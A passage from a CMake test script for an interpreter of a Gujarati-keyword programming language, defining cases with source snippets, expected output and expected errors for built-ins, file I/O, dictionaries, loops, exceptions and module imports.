    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_dabe_kapo")
    set(source [=[aavo
chhapo "[" + dabe_kapo("   hello world   ") + "]";
chhapo "[" + dabe_kapo(" \t\r\ntest") + "]";
chhapo "[" + dabe_kapo("no_spaces") + "]";
chhapo "[" + ડાબે_કાપો("  ગુજરાતી  ") + "]";
chhapo "[" + dabe_saf("   alias   ") + "]";
aavjo
]=])
    set(expected_stdout "[hello world   ]\n[test]\n[no_spaces]\n[ગુજરાતી  ]\n[alias   ]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_dabe_kapo_error")
    set(source [=[aavo
dabe_kapo();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_dabe_kapo_type_error")
    set(source [=[aavo
dabe_kapo(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for 'ડાબે_કાપો' or 'dabe_kapo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_dabe_kapo_gujarati_error")
    set(source [=[આવો
ડાબે_કાપો(123);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'ડાબે_કાપો' માટે લખાણ દલીલ અપેક્ષિત છે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_dabe_kapo")
    set(source [=[aavo
kary dabe_kapo(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_jamne_kapo")
    set(source [=[aavo
chhapo "[" + jamne_kapo("   hello world   ") + "]";
chhapo "[" + jamne_kapo("test\t\r\n ") + "]";
chhapo "[" + jamne_kapo("no_spaces") + "]";
chhapo "[" + જમણે_કાપો("  ગુજરાતી  ") + "]";
chhapo "[" + jamne_saf("   alias   ") + "]";
aavjo
]=])
    set(expected_stdout "[   hello world]\n[test]\n[no_spaces]\n[  ગુજરાતી]\n[   alias]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_jamne_kapo_error")
    set(source [=[aavo
jamne_kapo();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_jamne_kapo_type_error")
    set(source [=[aavo
jamne_kapo(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for 'જમણે_કાપો' or 'jamne_kapo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_jamne_kapo_gujarati_error")
    set(source [=[આવો
જમણે_કાપો(123);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'જમણે_કાપો' માટે લખાણ દલીલ અપેક્ષિત છે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_jamne_kapo")
    set(source [=[aavo
kary jamne_kapo(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_vibhaajan_pankti")
    set(source [=[aavo
chhapo vibhaajan_pankti("one\ntwo\nthree");
chhapo vibhaajan_pankti("first\r\nsecond\r\n");
chhapo vibhaajan_pankti("");
chhapo vibhaajan_pankti("single");
chhapo વિભાજન_પંક્તિ("લાઇન ૧\nલાઇન ૨");
chhapo panktiyo("a\nb");
aavjo
]=])
    set(expected_stdout "[one, two, three]\n[first, second]\n[]\n[single]\n[લાઇન ૧, લાઇન ૨]\n[a, b]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_vibhaajan_pankti_error")
    set(source [=[aavo
vibhaajan_pankti();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_vibhaajan_pankti_type_error")
    set(source [=[aavo
vibhaajan_pankti(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for 'વિભાજન_પંક્તિ' or 'vibhaajan_pankti'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_vibhaajan_pankti_gujarati_error")
    set(source [=[આવો
વિભાજન_પંક્તિ(123);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'વિભાજન_પંક્તિ' માટે લખાણ દલીલ અપેક્ષિત છે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_vibhaajan_pankti")
    set(source [=[aavo
kary vibhaajan_pankti(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_aksharo")
    set(source [=[aavo
chhapo aksharo("abc");
chhapo aksharo("");
chhapo અક્ષરો("ગુજરાતી");
aavjo
]=])
    set(expected_stdout "[a, b, c]\n[]\n[ગ, ુ, જ, ર, ા, ત, ી]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_aksharo_error")
    set(source [=[aavo
aksharo();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_aksharo_type_error")
    set(source [=[aavo
aksharo(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for 'અક્ષરો' or 'aksharo'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_aksharo_gujarati_error")
    set(source [=[આવો
અક્ષરો(123);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'અક્ષરો' માટે લખાણ દલીલ અપેક્ષિત છે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_aksharo")
    set(source [=[aavo
kary aksharo(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_paryavaran")
    set(source [=[aavo
jo (lambai(paryavaran("PATH")) > 0) {
    chhapo "has path";
}
chhapo paryavaran("NON_EXISTENT_VAR_xyz_12345");
chhapo prakar(paryavaran("NON_EXISTENT_VAR_xyz_12345"));
chhapo prakar(પર્યાવરણ("NON_EXISTENT_VAR_xyz_12345"));
aavjo
]=])
    set(expected_stdout "has path\nનકામો\nnull\nnull\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_paryavaran_error")
    set(source [=[aavo
paryavaran();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_paryavaran_type_error")
    set(source [=[aavo
paryavaran(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string argument for 'પર્યાવરણ' or 'paryavaran'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_paryavaran_gujarati_error")
    set(source [=[આવો
પર્યાવરણ(123);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'પર્યાવરણ' માટે લખાણ દલીલ અપેક્ષિત છે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_paryavaran")
    set(source [=[aavo
kary paryavaran(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_bahar")
    set(source [=[aavo
chhapo "before exit";
bahar();
chhapo "after exit should not run";
aavjo
]=])
    set(expected_stdout "before exit\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_bahar_code")
    set(source [=[aavo
chhapo "exiting with 42";
bahar(42);
aavjo
]=])
    set(expected_stdout "exiting with 42\n")
    set(expected_stderr "")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_bahar_unexecuted")
    set(source [=[aavo
jo (0) {
    bahar(1);
}
chhapo "survived";
aavjo
]=])
    set(expected_stdout "survived\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_bahar_type_error")
    set(source [=[aavo
bahar(-1);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "exit code for 'બહાર' or 'bahar' must be a whole number between 0 and 255")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_bahar_gujarati_error")
    set(source [=[આવો
બહાર(999);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'બહાર' માટે એક્ઝિટ કોડ ૦ અને ૨૫૫ વચ્ચેનો પૂર્ણ આંક હોવો જોઈએ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_bahar")
    set(source [=[aavo
kary bahar(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_chakaso")
    set(source [=[aavo
chakaso(1);
chakaso(5 > 2, "five is greater than two");
ચકાસો(10 == 10);
chhapo "all assertions passed";
aavjo
]=])
    set(expected_stdout "all assertions passed\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_chakaso_fail")
    set(source [=[aavo
chakaso(0);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "assertion failed")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_chakaso_fail_custom")
    set(source [=[aavo
chakaso(0, "custom check failed!");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "custom check failed!")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_chakaso_msg_type_error")
    set(source [=[aavo
chakaso(1, 123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "assertion failure message must be a string")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_chakaso_gujarati_error")
    set(source [=[આવો
ચકાસો(0);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "ચકાસણી નિષ્ફળ ગઈ")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_chakaso")
    set(source [=[aavo
kary chakaso(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_samave_lakhan")
    set(source [=[aavo
chhapo samave_lakhan("hello world", "world");
chhapo samave_lakhan("hello world", "planet");
chhapo samave_lakhan("hello", "");
chhapo સમાવે_લખાણ("નમસ્તે ગુજરાત", "ગુજરાત");
chhapo સમાવે_લખાણ("નમસ્તે ગુજરાત", "ભારત");
aavjo
]=])
    set(expected_stdout "1\n0\n1\n1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_samave_lakhan_error")
    set(source [=[aavo
samave_lakhan();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_samave_lakhan_type_error")
    set(source [=[aavo
samave_lakhan("hello", 123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected string arguments for 'સમાવે_લખાણ' or 'samave_lakhan'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_samave_lakhan_gujarati_error")
    set(source [=[આવો
સમાવે_લખાણ("hello", 123);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "'સમાવે_લખાણ' માટે લખાણ દલીલો અપેક્ષિત છે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_samave_lakhan")
    set(source [=[aavo
kary samave_lakhan(x) { parat x; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_file_io")
    set(source [=[aavo
path = "file_io_test_tmp.txt";
file_kadho(path);
chhapo file_chhe(path);
chhapo file_lakho(path, "Hello Gujarat!");
chhapo file_chhe(path);
chhapo file_kad(path);
chhapo file_vancho(path);
chhapo file_umero(path, " and India!");
chhapo file_kad(path);
chhapo file_vancho(path);
chhapo file_kadho(path);
chhapo file_chhe(path);
chhapo prakar(file_vancho(path));
chhapo prakar(file_kad(path));
aavjo
]=])
    set(expected_stdout "0\n1\n1\n14\nHello Gujarat!\n1\n25\nHello Gujarat! and India!\n1\n0\nnull\nnull\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_file_io_gujarati")
    set(source [=[આવો
પાથ = "file_io_gu_tmp.txt";
ફાઇલ_હટાવો(પાથ);
છાપો ફાઇલ_છે(પાથ);
છાપો ફાઇલ_લખો(પાથ, "ગુજરાતી");
છાપો ફાઇલ_છે(પાથ);
છાપો ફાઇલ_વાંચો(પાથ);
છાપો ફાઇલ_કદ(પાથ);
છાપો ફાઇલ_હટાવો(પાથ);
છાપો ફાઇલ_છે(પાથ);
આવજો
]=])
    set(expected_stdout "0\n1\n1\nગુજરાતી\n21\n1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "builtin_file_io_error_args")
    set(source [=[aavo
file_vancho();
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "incorrect number of function arguments")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_file_io_error_path_type")
    set(source [=[aavo
file_vancho(123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a string file path")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_file_io_error_content_type")
    set(source [=[aavo
file_lakho("file.txt", 123);
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected string content for file operation")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_file_io_gujarati_error")
    set(source [=[આવો
ફાઇલ_વાંચો(123);
આવજો
]=])
    set(expected_stdout "")
    set(expected_stderr "ફાઇલ પાથ માટે લખાણ હોવું જરૂરી છે")
    set(expect_failure TRUE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "reserved_file_io")
    set(source [=[aavo
kary file_vancho(p) { parat p; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "built-in function name cannot be declared")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_dict_literals")
    set(source [=[aavo
d = {"a": 10, "b": "hello", "c": [1, 2]};
chhapo d["a"];
chhapo d["b"];
chhapo d["c"];
chhapo prakar(d);
chhapo lambai(d);
chhapo samave_chhe(d, "a");
chhapo samave_chhe(d, "missing");
d["d"] = 99;
chhapo d["d"];
chhapo lambai(d);
d["a"] = 100;
chhapo d["a"];
chhapo dur_karo(d, "b");
chhapo samave_chhe(d, "b");
chhapo lambai(d);
empty = {};
chhapo prakar(empty);
chhapo lambai(empty);
aavjo
]=])
    set(expected_stdout "10\nhello\n[1, 2]\ndict\n3\n1\n0\n99\n4\n100\n1\n0\n3\ndict\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_dict_constructors_and_helpers")
    set(source [=[aavo
d = kosh("name", "Gujarati", "version", 1);
chhapo d["name"];
chhapo d["version"];
chhapo chavio(d);
chhapo mulyo(d);
aavjo
]=])
    set(expected_stdout "Gujarati\n1\n[name, version]\n[Gujarati, 1]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_dict_gujarati")
    set(source [=[આવો
દ = {"નામ": "ગુજરાત", "કોડ": 24};
છાપો દ["નામ"];
છાપો દ["કોડ"];
છાપો પ્રકાર(દ);
છાપો લંબાઈ(દ);
છાપો સમાવે_છે(દ, "નામ");
છાપો દૂર_કરો(દ, "કોડ");
છાપો લંબાઈ(દ);
છાપો ચાવીઓ(દ);
છાપો મૂલ્યો(દ);
આવજો
]=])
    set(expected_stdout "ગુજરાત\n24\ndict\n2\n1\n1\n1\n[નામ]\n[ગુજરાત]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "builtin_dict_for_iteration")
    set(source [=[aavo
scores = {"Alice": 95, "Bob": 80};
darek (k ma scores) {
    chhapo k;
    chhapo scores[k];
}
aavjo
]=])
    set(expected_stdout "Alice\n95\nBob\n80\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_dict_errors")
    set(source [=[aavo
d = kosh("a");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected an even number of key-value arguments for 'શબ્દકોશ' or 'kosh'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "loop_control_while")
    set(source [=[aavo
i = 0;
jya_sudhi (i < 5) {
    i = i + 1;
    jo (i == 2) {
        chalu_rakho;
    }
    jo (i == 4) {
        atko;
    }
    chhapo i;
}
aavjo
]=])
    set(expected_stdout "1\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "loop_control_for")
    set(source [=[aavo
darek (x ma 1..6) {
    jo (x == 2) {
        aagal;
    }
    jo (x == 5) {
        atko;
    }
    chhapo x;
}
aavjo
]=])
    set(expected_stdout "1\n3\n4\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "loop_control_gujarati")
    set(source [=[આવો
સંખ્યા = 0;
જ્યાં સુધી (સંખ્યા < 5) {
    સંખ્યા = સંખ્યા + 1;
    જો (સંખ્યા == 2) {
        ચાલુ_રાખો;
    }
    જો (સંખ્યા == 4) {
        અટકો;
    }
    છાપો સંખ્યા;
}
આવજો
]=])
    set(expected_stdout "1\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "loop_control_outside_loop_error")
    set(source [=[aavo
atko;
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "'અટકો' or 'atko' can only be used inside a loop")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_datetime_ops")
    set(source [=[aavo
ts = 1700000000;
chhapo prakar(samay());
chhapo varsh(ts);
chhapo tarikh("%Y", ts);
chhapo mahino(ts) >= 1;
chhapo divas(ts) >= 1;
chhapo kalak(ts) >= 0;
chhapo minute(ts) >= 0;
chhapo second(ts) >= 0;
chhapo shant(1);
aavjo
]=])
    set(expected_stdout "number\n2023\n2023\n1\n1\n1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_datetime_gujarati")
    set(source [=[આવો
મુદ્રા = 1700000000;
છાપો પ્રકાર(સમય());
છાપો વર્ષ(મુદ્રા);
છાપો તારીખ("%Y", મુદ્રા);
છાપો મહિનો(મુદ્રા) >= 1;
છાપો દિવસ(મુદ્રા) >= 1;
છાપો કલાક(મુદ્રા) >= 0;
છાપો મિનિટ(મુદ્રા) >= 0;
છાપો સેકન્ડ(મુદ્રા) >= 0;
છાપો શાંત(1);
આવજો
]=])
    set(expected_stdout "number\n2023\n2023\n1\n1\n1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "builtin_datetime_errors")
    set(source [=[aavo
varsh("not_number");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "timestamp must be a number")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_try_catch_recovery")
    set(source [=[aavo
recovered = 0;
prayatna {
    x = 10 / 0;
    chhapo "not reached";
} pakdo (err) {
    recovered = 1;
    chhapo err;
}
chhapo recovered;
aavjo
]=])
    set(expected_stdout "division by zero\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_try_catch_custom_throw")
    set(source [=[aavo
prayatna {
    phenko("custom error message");
    chhapo "not reached";
} pakdo (msg) {
    chhapo msg;
}
chhapo "after try catch";
aavjo
]=])
    set(expected_stdout "custom error message\nafter try catch\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_try_catch_gujarati")
    set(source [=[આવો
પ્રયત્ન {
    ફેંકો("કસ્ટમ ભૂલ સંદેશ");
    છાપો "અહીં નહીં પહોંચે";
} પકડો (સંદેશ) {
    છાપો સંદેશ;
}
છાપો "પછીનું કાર્ય";
આવજો
]=])
    set(expected_stdout "કસ્ટમ ભૂલ સંદેશ\nપછીનું કાર્ય\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "builtin_try_catch_no_error")
    set(source [=[aavo
prayatna {
    chhapo "all good";
} pakdo (err) {
    chhapo "should not run";
}
chhapo "done";
aavjo
]=])
    set(expected_stdout "all good\ndone\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "builtin_try_catch_unhandled_phenko")
    set(source [=[aavo
phenko("fatal failure");
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "fatal failure")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "builtin_try_missing_catch_error")
    set(source [=[aavo
prayatna {
    chhapo 1;
}
chhapo 2;
aavjo
]=])
    set(expected_stdout "1\n")
    set(expected_stderr "expected 'પકડો' or 'pakdo' block after 'પ્રયત્ન' or 'prayatna'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "romanized_error")
    set(source [=[aavo
bhul "stop here";
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "error: stop here")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "romanized_fatal_error")
    set(source [=[aavo
ghatak_bhul "stop here";
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "fatal error: stop here")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "lists_and_indexing")
    set(source [=[aavo
items = [1, "two", [3, nakamo]];
chhapo items;
chhapo items[1];
chhapo items[2][0];
chhapo lambai(items);
aavjo
]=])
    set(expected_stdout "[1, two, [3, નકામો]]\ntwo\n3\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "list_index_assignment")
    set(source [=[aavo
items = [1, 2];
items[1] = "updated";
chhapo items[1];
aavjo
]=])
    set(expected_stdout "updated\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "list_index_out_of_range")
    set(source [=[aavo
items = [1];
chhapo items[1];
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "list index is out of range")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "list_index_fractional")
    set(source [=[aavo
items = [1];
chhapo items[0.5];
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "list index must be a non-negative whole number")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "non_list_index")
    set(source [=[aavo
value = 1;
chhapo value[0];
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "cannot index a non-list value")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "for_list_iteration")
    set(source [=[aavo
items = [1, "two", 3];
darek (item ma items) { chhapo item; }
aavjo
]=])
    set(expected_stdout "1\ntwo\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "for_numeric_range")
    set(source [=[aavo
darek (index ma 2..5) { chhapo index; }
aavjo
]=])
    set(expected_stdout "2\n3\n4\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "for_empty_range")
    set(source [=[aavo
darek (index ma 5..2) { chhapo "wrong"; }
chhapo "after";
aavjo
]=])
    set(expected_stdout "after\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "for_non_list_error")
    set(source [=[aavo
darek (item ma 3) { chhapo item; }
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a list argument for loop")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "module_import_shared_namespace")
    set(module_directory "${TEST_BINARY_DIR}/module-import")
    file(MAKE_DIRECTORY "${module_directory}")
    file(WRITE "${module_directory}/library.gj"
        "aavo\nshared = \"from module\";\nkary get_value() { parat shared; }\nchhapo \"loaded\";\naavjo\n")
    set(source_path "${module_directory}/main.gj")
    set(source [=[aavo
import "library.gj";
import "./nested/../library.gj";
chhapo get_value();
aavjo
]=])
    set(expected_stdout "loaded\nfrom module\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "nested_relative_module_import")
    set(module_directory "${TEST_BINARY_DIR}/nested-modules")
    file(MAKE_DIRECTORY "${module_directory}/sub")
    file(WRITE "${module_directory}/shared.gj"
        "aavo\nshared = 7;\naavjo\n")
    file(WRITE "${module_directory}/sub/child.gj"
        "aavo\nimport \"../shared.gj\";\nshared = shared + 1;\naavjo\n")
    set(source_path "${module_directory}/main.gj")
    set(source [=[aavo
import "sub/child.gj";
chhapo shared;
aavjo
]=])
    set(expected_stdout "8\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "circular_module_import")
    set(module_directory "${TEST_BINARY_DIR}/circular-modules")
    file(MAKE_DIRECTORY "${module_directory}")
    file(WRITE "${module_directory}/first.gj"
        "aavo\nimport \"second.gj\";\naavjo\n")
    file(WRITE "${module_directory}/second.gj"
        "aavo\nimport \"first.gj\";\naavjo\n")
    set(source_path "${module_directory}/main.gj")
    set(source [=[aavo
import "first.gj";
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "circular module import detected")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "missing_module_import")
    set(source [=[aavo
import "missing.gj";
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "could not open file")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "import_expected_path")
    set(source [=[aavo
import 123;
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a quoted module path after 'import'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "import_empty_path")
    set(source [=[aavo
import "";
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected a quoted module path after 'import'")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "import_missing_semicolon")
    set(source [=[aavo
import "helpers.gj"
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "expected ';' after module import")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "empty_list_index_error")
    set(source [=[aavo
items = [];
chhapo items[0];
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "list index is out of range")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "empty_list_assignment_error")
    set(source [=[aavo
items = [];
items[0] = 1;
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "list index is out of range")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "source_context_undefined_variable")
    set(source [=[aavo
chhapo missing;
aavjo
]=])
    set(expected_stdout "")
    set(expected_stderr "  chhapo missing;\n         ^")
    set(expect_failure TRUE)
elseif(TEST_CASE STREQUAL "repl_source_reallocation")
    set(source "")
    set(program_arguments --repl)
    set(input_text [=[message = "persist";
kary get_message() { parat message; }
pad1 = "1234567890123456789012345678901234567890";
pad2 = "1234567890123456789012345678901234567890";
pad3 = "1234567890123456789012345678901234567890";
pad4 = "1234567890123456789012345678901234567890";
pad5 = "1234567890123456789012345678901234567890";
chhapo message;
chhapo get_message();
]=])
    set(expected_stdout "GujaratiLang> GujaratiLang> GujaratiLang> GujaratiLang> GujaratiLang> GujaratiLang> GujaratiLang> GujaratiLang> persist\nGujaratiLang> persist\nGujaratiLang> ")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "nested_list_index_assignment")
    set(source [=[aavo
items = [[1, 2]];
items[0][1] = 9;
chhapo items;
aavjo
]=])
    set(expected_stdout "[[1, 9]]\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "gujarati_for_iteration")
    set(source [=[આવો
દરેક (મૂલ્ય માં [4, 5]) { છાપો મૂલ્ય; }
આવજો
]=])
    set(expected_stdout "4\n5\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "romanized_import_alias")
    set(module_directory "${TEST_BINARY_DIR}/romanized-import")
    file(MAKE_DIRECTORY "${module_directory}")
    file(WRITE "${module_directory}/helper.gj"
        "aavo\nshared = 9;\naavjo\n")
    set(source_path "${module_directory}/main.gj")
    set(source [=[aavo
aayat "helper.gj";
chhapo shared;
aavjo
]=])
    set(expected_stdout "9\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "gujarati_import_alias")
    set(module_directory "${TEST_BINARY_DIR}/gujarati-import")
    file(MAKE_DIRECTORY "${module_directory}")
    file(WRITE "${module_directory}/helper.gj"
        "આવો\nshared = 11;\nઆવજો\n")
    set(source_path "${module_directory}/main.gj")
    set(source [=[આવો
આયાત "helper.gj";
છાપો shared;
આવજો
]=])
    set(expected_stdout "11\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "cyclic_list_printing")
    set(source [=[aavo
items = [0];
items[0] = items;
chhapo items;
aavjo
]=])
